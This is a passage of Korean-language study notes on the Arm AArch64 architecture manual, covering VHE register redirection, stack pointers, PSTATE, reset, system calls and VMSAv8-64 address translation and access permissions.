다이어그램은 E2H == 1 일 때의 모습이다. HCR_EL2.TGE 비트가 Host OS 위에서 도는 EL0인지 Guest OS 위에서 도는 EL0인지를 결정한다.\nVHE가 제대로 동작하려면 특정 register에 대한 액세스도 리다이렉팅해야한다. 당연한 이유지만 unmodified kernel은 EL1을 염두에 두고 개발되었다. 이를 EL2에서 돌리려면 E2H bit에 따라 TTBR0_EL1의 경우 TTBR0_EL2 혹은 TTBR0_EL1으로 리다이렉팅한다.\n그런데 단순히 커널을 E2H에 따라 TTBR0_EL2로 리다이렉팅 해버리면, 커널 모듈식으로 붙어있는 하이퍼바이저는 EL1에 접근할 수가 없게 되는 문제가 발생한다. 원래 구조가 Guest OS들이 EL1에서 동작하기 때문에 EL2에서 무조건 EL1에 대한 접근이 필요하다.\n이러한 문제를 해결하기 위해서 따로 EL12와 EL02 접미사를 가진 레지스터들을 추가했다. 그래서 위와 같이 EL2 하이퍼바이저에서 EL1 레지스터에 접근할 수 있게 된다.\nD1.6 Registers for instruction processing and exception handling Arm 아키텍처에서 레지스터는 다음 두 가지 카테고리로 분류된다.\nsystem control이나 status reporting을 제공하는 System register. 명령 처리에 이용되는 레지스터. ex) 연산이나 exception handling D1.6.2 The stack pointer registers AArch64 state에선 범용 레지스터 외에도 dedicated 스택 포인터 레지스터가 각자의 exception level에 따라 구현된다.\nSP_EL0, SP_EL1 EL2가 구현되었다면, SP_EL2 EL3가 구현되었다면, SP_EL3 이러한 스택 포인터들의 선택은 다음과 같이 이루어진다.\nEL0에선 PE는 SP_EL0를 이용한다. 다른 exception level에선 SP_EL0 혹은 그에 맞는 SP_ELx가 선택될 수 있다. 기본적으로 exception이 받아질때는 그 타겟 exception level에 맞는 SP_ELx가 선택된다. SP_EL0에 액세스하려면 PSTATE SP를 업데이트 함으로써 액세스할 수 있다. 다음과 같은 접미사를 붙여서 스택 포인터를 표현하기도 한다.\nt - SP_EL0 스택 포인터를 이용한다. h - SP_ELx 스택 포인터를 이용한다. 근데 여기서 궁금했던 점이있었다. 각자의 ELx에 대해서 SP_ELx 라는 물리 레지스터 하나씩 갖고 있으면 됐지 왜 SP_EL0이 또 필요한가라는 점이 궁금했다. 근데 이 답에 대한 힌트는 아래 문구에 있었다. 왜 이 두 가지를 굳이 나눠서 논리 SP_ELxt, SP_ELxh로 나눠서 7개의 논리 SP를 가지도록 만들었을까? 실제로는 물리 SP_ELx는 단 4개 밖에 없지만 이렇게 나눈 이유가 있었다. 일단 Exception은 같은 EL에서도 발생할 수 있다고 했었다. exception이 raise되면 PE는 현재 exception level 이상, 타겟 exception level에 진입하고 SP_ELxh를 이용한다. 이때 handler는 최대한 PSTATE.SPSEL= 0으로 SP_ELxt를 이용해서 SP_EL0를 이용하려 시도한다.\n각자의 SP에 대해서 물리적으로 SP_ELx는 필요하다. AArch64에서 격리를 유지하면서 exception 발생시 바로 상위 exception level로 뛸때 동작할 스택이 저장되야하기 때문이다. 그런데 SP_ELxh를 계속 이용하지 않고 현재 SP를 저장하고 SP_EL0를 초기화해서 다시 이용하는 이유는 만약 SP_ELxh만을 SP로 이용했다면 nested exception이 발생했을 때 그전 SP_ELxh를 저장할 수 없기 때문이다. SP_ELxh, handler SP를 핸들링에 이용하게 될 때 같은 exception level에 대해서 nested exception이 발생하면 본래의 SP_ELxh는 무조건 날라가는 문제가 생겨서 exception handler는 exception 발생시 최대한 빠르게 레지스터들 백업하고 SP_ELxt로 진입하려 시도한다.\nD1.6.4 Saved Program Status Registers (SPSRs) 앞서 설명했던 SPSR의 용도를 생각해보면 당연히 얘도 Exception level 마다 존재한다.\nAArch64의 EL1에서 exception이 발생했을 때 SPSR_EL1을 이용한다. EL2가 구현되었다면 EL2에서의 exception은 SPSR_EL2를 이용한다. EL3가 구현되었다면 EL3에서의 exception은 SPSR_EL3를 이용한다. 특정 exception level에서 exception이 발생해서 PE가 처리해야할 때 PE state는 SPSR_ELx의 PSTATE에 저장된다. 즉 다음과 같은 의미를 가진다.\nexception에서 리턴할 때 PE state를 SPSR_ELx의 참조를 통해 복원할 수 있음을 나타낸다. exception 발생 당시의 PSTATE 값을 알 수 있다. 이때 저장되는 모든 PSTATE 필드들은 AArch32에서만 의미있거나 직접 읽기 쓰기 권한이 없더라도 저장된다. AArch32에서만 의미있는 필드들은 exception이 AArch32 state에서 AArch64 state로 발생했을 때 저장된다.\nD1.6.5 Exception Link Registers (ELRs) exception link register는 exception return address를 저장한다. PE가 exception을 받을 때 마다 ELR_ELx에 return address가 저장된다. 예를 들어서 EL1에 대한 exception이 발생했을 때에는 return address가 ELR_EL1에 저장되고 return하면 PC는 ELR에 저장된 return address로 복귀한다.\nAArch64 state는 다음과 같은 ELR을 제공한다.\nEL1에 대한 exception은 ELR_EL1을 이용한다. EL2가 구현되었다면, EL2에 대한 exception은 ELR_EL2를 이용한다. EL3가 구현되었다면, EL3에 대한 exception은 ELR_EL3를 이용한다. D1.7 Process state, PSTATE Armv8-A 아키텍처에서 PSTATE는 process state를 나타낸다. PSTATE 필드는 다음과 같다.\nThe condition flags N - 음수 플래그 Z - 제로 플래그 C - 캐리 플래그 V - 오버플로우 플래그 The execution state controls SS - Software Step bit 좀 더 높은 exception level에서 lower exception level에 대해서 single-step 명령을 실행시킬 수 있다. 디버거의 single step 생각하면 된다. IL - Illegal Execution state bit PSTATE.IL이 1이면 어떤 명령이 시도되더라도 Illegal Execution state exception이 발생한다. 만약 EL0에서 IL이 1이 되면 EL1에서 이를 처리한다. nRW - Current Execution state AArch64에서 0으로 세팅된다. AArch64를 사용하는 ELx로의 Warm reset 혹은 Exception이 받아질때의 CPSR.nRW는 0이다. 반대로 AArch32 일때는 1이다. EL - Current Exception level AArch64로의 Warm reset시에는 이 필드는 가장 높은 Exception level을 가리키게 된다. SP - Stack pointer selection bit 전에 SP_ELxt SP_ELxh 두 가지 옵션이 지원된다고 설명했었는데, 이때 이 두 가지 옵션을 결정하는 비트가 PSTATE.SP 비트이다. 이때 t 접미사가 붙은 SP_ELxt는 SP_EL0를 가리킨다. Warm reset이나 AArch64 state로의 exception은 이 비트를 1로 만든다. 이는 SP_ELx가 선택된다는 뜻이다. The exception mask bits D - Debug exception mask bit 이 비트가 설정되면 debug exception을 막는다. Warm reset이나 AArch64로의 exception을 받으면 1로 세팅된다. A, I, F - Asynchhronous exception mask bits A - SError, 시스템 에러 interrupt를 막는다. I - IRQ interrupt를 막는다. F - FIQ interrupt를 막는다. Access control bits PAN - Privilege Acess Never state bit PAN가 1일때 어떠한 EL1 or EL2의 가상 메모리 주소 privileged data access D1.9 Reset Cold reset PE가 실행중인 모든 로직을 리셋한다. 이러한 로직은 cold reset domain에 속한다고도 표현한다. power up시에 reset이 cold reset이다. Warm reset PE가 실행중인 일부 로직을 리셋한다. 이러한 로직은 warm reset domain에 속한다고도 표현한다. warm reset에서 리셋되는 로직은 cold reset에서 무조건 리셋된다. RMR_ELx 레지스터가 구현되어있다면, RMR_ELx.RR 비트를 1로 바꿈으로써 warm reset 요청을 할 수 있다.\n이러한 리셋시에는 PE는 구현된 가장 높은 Exception level로 진입한다. 가장 높은 exception level이 동작할 때 다음과 같은 특징을 가진다.\n무조건 Reset Management Register(RMR)이 구현되어있어야한다. RMR이 하나라면 가장 높은 exception level에 한해서 구현된다. Cold reset 시에 execution state는 configuration input signal에 의해 결정된다. Warm reset 시에는 execution state는 RMR_ELx.AA64에 의해 결정된다. 가장 높은 exception level이 AArch64 state로 설정되어있고, reset(warm, cold)시에 다음이 수행된다.\nSP_ELx가 선택된다. IMPLEMENTATION DEFINED인 PA address에서 실행을 시작한다. 가장 높은 exception level 레지스터 RVBAR_ELx가 그 주소를 가지고 있다. 당연하겠지만, RVBAR_EL0은 없다. 최소가 EL1이기 때문이다. D1.9.1 PE state on reset to AArch64 state reset 이후 대부분의 PE state는 UNKNOWN이다. 그래도 일부의 PE state는 정의되어있다. PE가 reset을 하면서 PE state는 정의된대로 돌아가게 된다.\n예를 들어서 PSTATE.{D, A, I, F} interrupt mask는 1로 세팅된다. 왜냐하면 reset 시에는 저러한 interrupt를 핸들링할 벡터가 설정되지 않았기 때문이다. 범용 레지스터, 부동 소수점, SIMD 들도 UNKNOWN 상태로 설정된다.\n이런식으로 초기 세팅의 값으로 돌아가게 된다.\nD1.15 System calls System call은 SVC, HVC, SMC 명령에 의해 발생한다.\nThe Supervisor Call (SVC) 명령은 user mode 프로그램이 os 서비스를 요청할 때 이용한다. EL1을 타겟팅하는 synchronous exception 이다. The Hypervisor Call (HVC) 명령은 guest OS가 hypervisor 서비스를 요청할 때 이용된다. EL2를 타겟팅하는 synchronous exception 이다. HVC 명령은 EL0와 Secure state EL1에서 정의되지 않는다. The Secure monitor Call (SMC) 명령은 Normal world가 Secure world 서비스를 요청할 때 이용된다. EL3를 타겟팅하는 synchronous exception 이다. 당연히 EL0에서 SMC는 정의되지 않는다. 다음과 같은 것들이 가능하다.\nEL2와 EL3는 Hypervisor call exception을 비활성화 할 수 있다. EL2는 SMC로 trap을 걸 수 있다. EL3는 Secure monitor call exception을 비활성화 할 수 있다. D5 The AArch64 Virtual Memory System Architecture D5.1 About the Virtual Memory System Architecture (VMSA) MMU가 VA를 PA 변환한다. 이러한 VA가 PA로 변환되는 방식은 Exception level과 Security state에 따라 다르다. MMU는 단순히 변환만 하는게 아니라 액세스 권한과 속성에 대한 검사도 진행한다. 이러한 변환 단계는 단일 단계일 수도 있고 두 가지 연속적인 단계가 필요할 수도 있다.\n여기서 Exception level에 따라 독립적으로 주소 변환이 이루어진다는 말은 다음과 같다. 위와 같이 변환될때 Exception level과 security state에 따라 translation regime가 다른것을 확인할 수 있다.\n각자의 가상 주소 공간을 가진다. 이런식으로 각자의 가상 공간의 테이블과 설정? 들을 translation regime라고 칭한다.\nD5.1.1 Armv8 VMSA naming VMSA 네이밍은 가능한 주소 변환 단계를 나타낸다.\nVMSAv8 아래 두 가지를 모두 아우르는 scheme이다. VMSAv8-32 AArch32의 Exception level에서 핸들링되는 단일 단계 변환 scheme이다. 가끔 VA를 PA에 매핑하기 위해서 두 단계를 거치기도 한다. 이런 단계들은 모두 AArch32의 Exception level에서 처리된다. VMSAv8-64 VMSAv8-32의 AArch64 버전이다. D5.1.2 The Armv8 VMSA when some Exception levels are using AArch32 Higher exception level에선 AArch64를 사용하는 반면 Lower exception level에서는 AArch32를 사용할 수 있다고 앞에서 설명했다.\nEL0에서 AArch32를 쓰더라도 좀 더 높은 exception level EL1에서는 AArch64를 쓰는 경우에선 EL0는 VMSAv8-64 방식을 이용한다.\nD5.1.3 VMSA address types and address spaces Virtual address (VA)\n명령어 실행에 이용되는 주소이다. AArch64 state 에서 VA는 다음과 같은 최대 address width를 가진다. 48 bits. 52 bits. - FEAT_LVA가 구현되어 주소 변환시 64kb granule를 이용할 때. 52 bits. - 다음이 참일 때. FEAT_LPA2가 구현되었을 때. TCR_ELx.DS == 1 일때 translation regime가 바뀐다. TCR 레지스터는 Translation control register이다. 4kb나 16kb granule를를 사용할 때. 하나의 주소 변환 단계 (Translation stage) 가 하나의 VA 범위를 변환하는 경우 48-bit VA 0x0000000000000000 to 0x0000FFFFFFFFFFFF 52-bit VA 0x0000000000000000 to 0x000FFFFFFFFFFFFF 하나의 주소 변환 단계가 두 개의 VA 범위로 나누어서 변환하는 경우 bottom VA 48-bit VA 0x0000000000000000 to 0x0000FFFFFFFFFFFF 52-bit VA 0x0000000000000000 to 0x000FFFFFFFFFFFFF top VA - 64bit를 모두 사용한다. 48-bit VA 0xFFFF000000000000 to 0xFFFFFFFFFFFFFFFF 52-bit VA 0xFFF0000000000000 to 0xFFFFFFFFFFFFFFFF 이렇게 나눠놓은 이유는 두 개의 subrange에 대해서 다르게 처리해야 할 필요가 있어서 그런 것 같다. Intermediate physical address (IPA)\n주소를 변환하면서 두 가지 주소 변환 단계가 있다. stage 1에서의 OA - 1 단계 변환의 출력 주소 이러한 1단계 변환에선 OS는 IPA를 PA로 착각한다. 처음에 변환되기 때문에 1단계 변환이라고 부른다. stage 2에서의 IA - 2 단계 변환의 입력 주소소 IPA를 PA로 변환하는 단계이다. 1 단계 변환이 변환한 IPA를 PA로 변환해서 2단계 변환이라고 부른다. 변환 과정에서 IPA와 PA는 비슷하다. 가상머신으로 운영체제를 실행했을 때 이러한 두 계층의 주소 변환이 필요하게 되는데 첫 번째 계층의 출력 주소로 볼 수 있다. Physical address (PA)\n실제 물리적인 주소이다. EL3에서 Secure EL1과 FEAT_SEL2가 활성화되면 Secure EL2 exception level은 Secure, Non-secure operation의 독립적인 PA space로 나눈다. Secure state에선 Secure PA space를 이용한다. Non-secure state에선 Non-secure PA space를 이용한다. D5.1.4 Address tagging in AArch64 state AArch64 state에서 address tagging을 지원한다. 여기서의 Address tagging과 Memory tagging extension을 혼동하면 안된다.\nAddress tagging의 VA의 상위 8비트는 다음을 결정할 때 무시된다.\n변환 시스템이 활성화 되어 있을 때, 그 VA가 범위 밖인지 아닌지 여부. translation fault가 일어난다. 변환 시스템이 활성화 되어 있지 않을 때 주소가 범위 밖인지 여부. address size fault가 일어난다. TLB invalidation 명령 실행시 그 주소가 invalidation이 필요할지 여부. 1 단계 변환에서 두 개의 VA 범위를 지원할 때 다음이 참이다.\nVA의 bit[55]에 따라 다음과 같이 address tag를 사용할지 여부를 결정하는 register bit를 결정한다. VA[55] == 0 TCR_ELx.TBI0 address tag를 사용할지 여부를 결정한다. 1 단계 변환이 활성화되었을 때 TTBR0_ELx는 변환 테이블(translation table)의 base address를 저장한다. TTBR은 Translation table base register로 x86의 CR3처럼 특정 페이지 테이블을 가리킨다. context switching이 일어날 때 마다 바뀌게 되는 특징이 있다. VA[55] == 1 TCR_ELx.TBI1 address tag를 사용할지 여부를 결정한다. 1 단계 변환이 활성화되었을 때 TTBR1_ELx는 변환 테이블(translation table)의 base address를 저장한다. 이런식으로 두 개의 범위를 tagging을 통해 처리한다. 1단계 변환에서 오직 하나의 VA 범위를 지원할 때 다음이 참이다.\n1단계 변환이 활성화 되었을 때 TCR_ELx.TBI가 address tag가 사용되는 여부를 결정한다. TTBR0_ELx는 변환 테이블의 base address를 저장한다. 왜 조건에 1 단계 변환의 활성화가 적혀있는지 의문을 가질 수 있는데, 그 이유는 TCR_ELx.TBIn bit는 해당 변환 단계의 사용 여부와 무관하게 address tags 사용 여부를 결정되기 때문이다.\n또한 FEAT_PAuth가 구현되어있다면, TBIDn 비트가 TCR_ELx에 추가된다. TCR_ELx.TBIn 비트가 켜져있다면, TBIDn 비트가 address tagging이 data address만 적용할 것인지 instruction address까지 적용할지 결정한다.\n이러한 Address tag 활성화 비트는 다음과 같은 예시처럼 PC의 영향을 줄 수 있다.\ncontrolled exception level 에서, TCR_EL3.TBI는 다음과 같은 영향을 제어한다. EL3에서의 분기나 함수 return. EL3로의 exception. exception return, EL3로 debug state exit. 마지막 debug state에서 나갈때는 정확히 잘 이해가 되지 않는다. TBIn 비트가 어떻게 제어되느냐에 따라 다음과 같은 영향을 가진다.\n1 단계 번역이 두 가지의 VA range를 지원한다. PC에 로딩되는 주소 55비트가 1이고 TBIn 비트가 1이라면 bits[63:56] 부분의 PC는 bit 55에 대한 sign extension이 일어나게된다. 사실 이건 앞에서 범위 얘기하면서 다뤘던 얘기이다. 그냥 같은 얘기. 1 단계 번역이 하나의 VA range를 지원한다. 55비트가 1이여도 bits[63:56]는 0x00으로 고정된다. 깔끔하게 정리하면 다음과 같다. TBI(Top byte ignorance) 비트에 따라 55 bit가 무시될지, 두 개의 VA range를 지원하는지 결정된다.\nD5.2 The VMSAv8-64 address translation system VMSAv8-64 주소 변환 시스템에 대해서 설명한다.\nD5.2.1 About the VMSAv8-64 address translation system MMU는 PE에 액세스에 대해 주소 변환과 액세스 권한 그리고 메모리 속성 결정과 체크를 담당한다.\n기본적인 MMU의 동작 모델은 원하는 메모리의 액세스에 대한 정보, 예를 들어서 IA(Input Address)를 받아들여 결과를 리턴한다.\n관련된 OA(Output Address)를 리턴한다. 변환을 완료할 수 없으면, exception이 생성되며 이 exception을 MMU fault라고 부른다. 시스템 레지스터를 이용해서 이러한 발생한 MMU fault를 알린다. IA -\u0026gt; OA로 매핑을 하는 과정을 단일 단계 변환 (single stage translation) 이라고 한다.\nVMSAv8 system에서 translation regime는 VA -\u0026gt; PA 로의 매핑에 하나 혹은 두 개의 단계를 거쳐 변환을 수행한다. translation granule은 IA -\u0026gt; OA로의 매핑의 세분성을 나타내며 이는 다음 두 가지를 정의한다.\n주소 변환의 단계의 page size IA -\u0026gt; OA 매핑의 최소 단위 메모리 블록. 특정 주소 변환 단계의 변환 테이블 (translation table)의 최대 크기 지금에선 변환 테이블의 최대 크기가 이해되지 않을 수 있다. D5.2.4에서 후술한다. MMU는 system register에 의해 주소 변환 단계마다 주소 변환이 제어된다. 변환 단계마다 address translations의 집합과 관련 메모리 속성이 memory mapped table에 존재하며 그 테이블을 translation tables라고 부른다. 하나의 translation table은 IA를 제한된 특정 비트들을 이용해서 주소를 변환한다. 그 이유는 하나의 address translation이 여러번의 lookup를 통해 변환을 해야할 수 있기 때문이다.\n그리고 이러한 translation table entry들은 Translation lookaside buffer(TLB)에 캐싱된다. 메모리 데이터가 L1, L2, L3 캐시에 캐싱되듯이, 주소들은 TLB에 주소 변환에 대한 데이터가 캐싱된다고 볼 수 있다. mips 사진이긴 하지만 table entry에는 ASID를 명시해서 다른 프로세스별 주소 공간을 명시한다. 이를 통해 context switching을 할 때 굳이 tlb flush를 통해 entry를 날리지 않고 유지시켜도 격리가 유지되게 된다. 그리고 위와 같이 코드를 공유하는 경우에 효율적으로 메모리 공간을 이용할 수 있다.\nIA -\u0026gt; OA 매핑에 대한 정보를 정의하는 translation table entry에서는 다음과 같은 속성들도 정의한다.\nSecure state에서 발생한 메모리 액세스, 즉 액세스가 Secure 혹은 Non-secure address 맵에 접근하는지 여부 액세스 권한 memory region property 메모리 타입이나 캐시 정책등이 이러한 property에 포함된다. AArch64 아키텍처에서 translation regime는 다음으로 구성된다.\n단일 단계 주소 변환 input VA를 바로 output PA로 변환한다. 연속적인 2 단계 주소 변환 Stage 1 - input VA -\u0026gt; output IPA Stage 2 - input IPA -\u0026gt; output PA 앞에서 이미 봤던 사진인데, 이번엔 좀 더 자세히 알아보겠다. EL1\u0026amp;0이고 EL2가 비활성화 되었을 때 - 1 단계 변환 같은 PA를 공유하는 OS가 없다. 그러므로 굳이 IPA를 둬서 2 단계 변환을 할 필요가 없다. HCR_EL2.{E2H, TGE}가 {0,0} 일 때 EL1이나 EL0일 때 이러한 변환 regime가 이용된다. HCR은 Hypervisor control register로 하이퍼 바이저( EL2 )의 동작에 대해 나타낸다. E2H는 VHE가 지원되지 않을 때를 뜻하니 단순 VA를 PA로만 변환하면 된다. SCR_EL3.NS == 1 일 때 Non-secure 메모리 액세스가 일어난다. SCR은 Secure configuration register이다. EL1\u0026amp;0이고 EL2가 활성화 되었을 때 - 2 단계 변환 같은 PA를 공유하는 OS가 있다. OS가 착각하는 PA를 의미한다. 즉 IPA. 같은 물리 메모리 주소에 대해 다른 값을 리턴해야할 필요가 생긴다. 그래서 2 단계 변환을 통해 guest os의 PA를 IPA로 속여서 변환해야한다. EL2나 EL3 - 1단계 변환 그냥 바로 접근해도 상관없기 때문에 단일 단계 변환을 수행한다. EL2\u0026amp;0 변환 - 1 단계 변환 HCR_EL2.{E2H, TGE} 비트가 {1,1} 일 때 적용된다. 즉 host os가 EL2에서 돌고 있고 host application이 EL0에서 돌고 있을때이다. 이런 경우엔 1 단계 변환만으로도 충분하다. 왜냐하면 말은 EL2에서 EL0 변환이지만, 실제로는 FEAT_VHE에 의해서 표면적으로 그렇게 보일뿐이지 실제로의 변환은 단순 VA -\u0026gt; PA만 하면 끝이다. 단일 단계 주소 변환에서 TTBR_ELx는 IA를 OA로 매핑하기 위한 첫 번째 translation table을 가리킨다. 두 개의 VA range를 지원하는 경우 각자의 VA range는 독립된 IA -\u0026gt; OA 매핑을 가진다. 이는 다음을 말한다.\n두 개의 IA ranges를 지원하면 두 개의 translation tables가 지원된다. 하나의 IA range를 지원하면 하나의 translation table이 지원된다. 각자가 다른 table을 이용하게 되면서 각자 독립적인 매핑을 가지게 된다. 여기서 명심해야할 점은 두 개의 IA ranges를 지원하는건 오직 1 단계 변환만 가능하다. 바꿔말하면 두 개의 IA ranges를 지원한다면, 그 IA는 무조건 VA 라는 것이다.\nVMSAv8-64에서 주소 변환 단계는 Exception level에 영향을 받는다. VMSAv8-64에서 translation table안의 descriptor entry는 64 비트이다.\nVMSAv8-64 translation table format은 다음을 제공한다.\n4 단계 이상의 주소 lookups 4kb 혹은 16kb, 64kb인 translation granule 크기 IA/OA 주로 48 비트이지만 특정 FEAT_LPA2같은 feature에 따라 52 비트까지도 늘어날 수 있다. D5.2.3 Controlling address translation stages 위 표에 나와있듯이 각자의 변환 단계에 매칭되는 시스템 레지스터들이 존재한다.\nSCTLR (System control register)는 Exception level 별로 존재한다. 이는 Exception level 마다의 설정이 달라야하니 필요하다. TCR (Translation control register)는 Exception level 별로 존재하고 EL2에서 특정 하이퍼 바이저의 설정에 따라 추가적으로 VSTCR_EL2가 이용될 수 있으며 기본적으로 EL2가 구현되었다면 VTCR_EL2가 이용된다. TTBR (Translation table base register)는 Exception level 별로 존재하며 마찬가지로 EL2의 특정 옵션에 의해 추가적으로 이용될 수 있으며 EL2가 구현되었다면 VTTBR_EL2가 이용된다. 앞서 address tagging에 대해서 설명하면서 TCR_ELx.TBI0와 TCR_ELx.TBI1가 활성화 되었을 때 VA의 55 비트에 따라 TTBR0_ELx를 이용하는지 TTBR1_ELx를 이용지를 결정한다고 했었다. ID_AA64MMFR0_EL1.PARange 비트는 물리 주소 크기를 정한다. 활성화된 주소 변환 단계는 각자 TCR_ELx 레지스터를 가지며 IPS 비트에 따라 최대 output address의 크기도 정한다. 활성화된 변환 단계는 마찬가지로 각자의 TCR_ELx 레지스터를 가지며 TCR_ELx의 TxSZ 필드가 input address size를 지정한다.\n두 개의 VA ranges를 지원하는 경우 TCR_ELx는 두 개의 TxSZ 필드를 가지며 각자 하나의 VA range에 대응한다. TCR_ELx.T0SZ는 lower VA인 TTBR0_ELx에 대응한다. TCR_ELx.T1SZ는 higher VA인 TTBR1_ELx에 대응한다. 단일 VA range를 지원하는 경우 TCR_ELx의 T0SZ를 이용하며 TTBR0_ELx가 변환에 이용된다. 위 사진 single VA range를 지원하는 변환 단계의 메모리 맵이다. EL1\u0026amp;0 regime에서 EL2가 켜져있으면 여러 OS가 PA를 공유할 가능성이 있으므로 2 단계 변환을 수행한다. 위 사진은 두 개의 VA ranges를 지원할 때의 메모리 맵이다. D5.2.4 Memory translation granule size granule size는 다음을 정의한다.\n하나의 translation table의 최대 크기 memory 페이지 크기 위 표와 같이 1 단계 변환에선 ID_AA64MMFR0_EL1의 TGran4, 16, 64 필드를 통해 어떤 granule size가 지원되는지 확인할 수 있다. 2 단계 변환에서도 앞선 1 단계 변환처럼 똑같이 필드를 통해 granule size를 확인할 수 있다. 위와 같은 범위를 가진다. 전에 granule size가 page size와 최대 translation table의 크기를 정의한다고 했기 때문에 entry 개수는 2^12 / 2^3 = 2^9 개의 entries를 가지게 된다.\nD5.2.5 Translation tables and the translation process Translation table walk는 하나 혹은 그 이상의 translation table lookups를 말한다. Translation table walk는 VA를 PA로 변환하기 위해 필요한 일련의 lookup들이다.\ntranslation table walk는 가장 처음으로 TTBR_ELx을 읽어서 table의 base 주소를 얻는다. 그리고 각자의 translation table lookup은 다음중 하나를 포함하는 descriptor를 리턴한다.\ntable entry가 walk의 마지막 entry이면, 그 entry는 OA와 OA에 대한 권한, 속성을 포함한다. 추가적인 lookup이 필요하면, entry는 다음 lookup을 위한 base address를 포함한다. 추가적으로 secure translation regime를 이용할 경우 그 base address가 secure인지 non-secure인지를 나타낸다. 따로 명시적으로 non-secure address space라고 명시할 수도 있다. 여기서 hierarchical attributes 라는게 적용되는데, 이는 일부 속성이 좀 더 높은 레벨의 테이블 descriptor에서 명시될 수 있다. 이는 접근 권한, 실행 권한 그리고 물리 주소 공간에서도 적용된다. PXNTable(실행 권한)으로 예시를 들어보면 좀 더 높은 level의 table에 비트가 세팅되면 좀 더 낮은 레벨의 비트들은 무시되는 것을 알 수 있다. 또한 PXN을 비트를 클리어 시켜서 전 계층의 비트를 보존시킬 수도 있다. descriptor가 유효하지 않다면 translation fault가 발생한다. 앞서 PXN같은 용어가 나왔는데 추가적을 설명하자면 page table entry에서 다음과 같은 4 비트가 인코딩된다. UXN, Unprivileged Execute never - 이 페이지에선 EL0 코드를 실행할 수 없다. PXN, Privileged Execute never - 이 페이지에선 EL1 코드를 실행할 수 없다. AP 2bits, 01이면 커널과 유저모드 모두 접근가능하다. 단일 단계 변환의 translation table walk에 대한 그림이다. D_Block은 granule보다 큰 블록에 대한 descriptor이고 D_Page는 granule 크기에 대한 descriptor이다. 실제로 구현시에는 동일한 구조를 이용하여 구현한다. 3 level lookups가 필요한 경우에선 마지막에 D_Block 대신 D_Page로 의미상 이용된다고 한다. 위의 포맷을 보면 둘다 아예 같게 생긴 것을 확인할 수 있다.\nTTBR_ELx는 초기 lookup을 위한 translation table의 base address를 가지고 있다.\nEL2가 활성화 되었을 때 EL1\u0026amp;0 translation regime를 제외한 1 단계 변환은 TTBR_ELx의 output address나 어떠한 translation table descriptor에 의해 리턴된 translation table의 base address는 모두 PA이다. EL2가 활성화 되었을 때 EL1\u0026amp;0 translation의 1 단계 변환에서 TTBR_ELx의 output address나 어떠한 translation table descriptor에 의해 리턴된 translation table의 base address는 IPA이다. 그리고 2 단계 변환이 활성화 되어있다면 OA는 2 단계 변환의 대상이 된다. D5.2.6 Overview of the VMSAv8-64 address translation stages TCR_ELx의 TnSZ는 IA 범위를 정한다. 4kb granule 기준으로 위 표처럼 initial lookup level이 결정된다. TnSZ에 따라 initial lookup level이 달라진다. 이렇게 찾아간다. VTCR_EL2.T0SZ에 따라 IA 크기가 정해지고 initial lookup level이 결정된다.\n16kb granule도 표로 정리되어있긴 하지만 생략하겠다.\nD5.3 VMSAv8-64 Translation Table format descriptors 일반적으로 descriptor는 다음중 하나에 해당한다.\nAn invalid or fault entry. next-level translation table을 가리키는 table entry. Accesss를 위한 memory의 properties를 정의하는 block entry. 예약된 format. D5.3.1 VMSAv8-64 translation table level -1, level 0, level 1, and level 2 descriptor formats 사실 포맷은 granule size나 최대 OA size 같은 여러 요인에 따라 달라진다. 그런데 그냥 일반적인 경우 포맷은 거의 비슷하다. 그래서 실질적으로 포맷은 위와 같다.\nD.5.3.2 Armv8 translation table level 3 descriptor formats 이런식으로 granule size에 따라 포맷은 달라지게 된다.\nD5.3.3 Memory attribute fields in the VMSAv8-64 Translation Table format descriptors stage 1 translation에서 위 비트들은 다음 translation table access를 위한 속성을 정의한다.\nNSTable secure state에서 메모리 액세스할때 NSTable bit를 확인한다. non-secure state에선 EL2나 EL2\u0026amp;0을 포함해서 RES0이 되고 PE는 이를 무시한다. APTable 후속 level lookup시에 적용되는 permission bit들이다. 아래와 같이 적용된다. UXNTable or XNTable 후속 level lookup시에 적용되는 XN limit이다. naming은 stage 1 translation regime가 두 VA ranges를 지원하는지 유무에 따라 다르다. Stage 1이 두 개의 VA ranges를 지원할 때 이 필드는 UXNTable로 불린다. lower level lookup에서 그 region에서 fetch된 instruction이 EL0에서 실행되는 것을 허용하는지를 결정한다. Stage 1이 하나의 VA range를 지원할 때 XNTable로 명명된다. PXNTable Privileged execute never. 후속 levels of lookup에 관여한다. 이 필드는 항상 2 VA ranges를 지원하는 stage 1 translation에서만 valid 하다. 당연히 User, Kernel 나눠져야하니까 당연하다. 그래야 다른 translation table 쓰고 각기 다른 처리가 가능하다. 아까 앞에선 table descriptor였는데 얜 page \u0026amp; block descriptor의 경우이다. 1 stage block \u0026amp; page descriptor 모습이다. 메모리 속성이 upper, lower로 나눠진다. 마찬가지로 1 stage에서 두 VA ranges면 UXN 아니면 XN. PXN도 마찬가지. AP는 data access permission 관리한다. table descriptor format은 AP의 0 번째 비트를 정의하지 않는다. translation regime가 두 VA ranges를 지원하면 얘는 valid하며 singe VA range면 RES1이다. NS는 Non secure bit다. 2 stage block \u0026amp; page descriptor의 모습이다. 전이랑 비슷한데 여러 비트들이 많으니 생략한다. S2AP로 이름이 바뀐게 있는데, 그냥 stage 2 data access permission 비트로 AP랑 똑같다. D5.4 Memory access control access control field는 PE가 특정 주소에 접근할 때 그 주소의 접근을 컨트롤한다. 허용안하면 MMU fault.\n이는 다음에 적용된다.\nsingle exception level에 대한 변환, EL3 translation regime같은 거. EL0 그리고 높은 exception level에 대한 변환, EL1\u0026amp;0 translation regime 같은 거. D5.4.1 About access permissions translation table descriptor는 data accesses에 대한 access permissions과 instruction fetches에 대한 access permissions를 정의한다. PAN이나 PXN같은거에 대해서 더 자세하게 설명하는 섹션이다.\naccess permission 관련 비트들은 앞서 다뤘던 translation table format에 있었다.\nstage 1 translation, AP가 data access permission을 정의한다. stage 2에선 S2AP가 data access permission을 정의한다. UXN, XN, PXN 필드가 instruction fetches의 access controls를 정의한다. D5.4.2 About PSTATE.PAN PSTATE.PAN이 1이면 EL1, HCR_EL2.E2H가 1 일때 EL2에서 EL0이 액세스 가능한 가상 주소 액세스는 Permission fault를 생성한다. PSTATE.PAN 0이면 그 기능은 꺼진다. 그냥 SMAP랑 똑같은 거 같다.\n세부사항이 있지만 패스한다.\nD5.4.3 About PSTATE.UAO PSTATE.UAO가 1이면 unprivileged instruction load/store가 EL1혹은 HCR_EL2.{E2H, TGE}가 {1,1}일 때 EL2가 EL0가 아닌 현재 exception level에 적용되는 memory access permissions에 적용을 받는다.\n세부사항은 패스한다.\nD5.4.5 Data access permission controls stage 1 